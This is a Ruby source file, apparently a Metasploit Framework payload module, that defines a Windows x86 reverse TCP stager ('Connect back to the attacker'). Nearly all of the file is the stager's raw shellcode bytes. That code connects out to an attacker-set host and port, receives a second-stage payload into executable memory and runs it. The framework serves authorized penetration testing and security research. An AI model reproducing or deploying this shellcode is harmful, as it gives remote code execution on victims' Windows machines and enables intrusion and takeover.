##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

  CachedSize = 281

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['hdm', 'skape', 'sf'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        {
          'RequiresMidstager' => false,
          'Offsets' => {
            # ExitFunk Offset: 222
            'LHOST' => [ 190, 'ADDR' ],
            'LPORT' => [ 197, 'n' ],
            'ReverseConnectRetries' => [ 188, 'C']
          },
          'Payload' =>
            "\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C" +
            "\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52" +
            "\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20" +
            "\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC" +
            "\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75" +
            "\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3" +
            "\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF" +
            "\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77" +
            "\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00" +
            "\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x50\x50\x40" +
            "\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x05\x68\x7F\x00" +
            "\x00\x01\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5" +
            "\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E\x08\x75\xEC\x68\xF0\xB5" +
            "\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF" +
            "\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4" +
            "\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F" +
            "\xFF\xD5\x01\xC3\x29\xC6\x75\xEE\xC3"
        }
      ))


  end

end
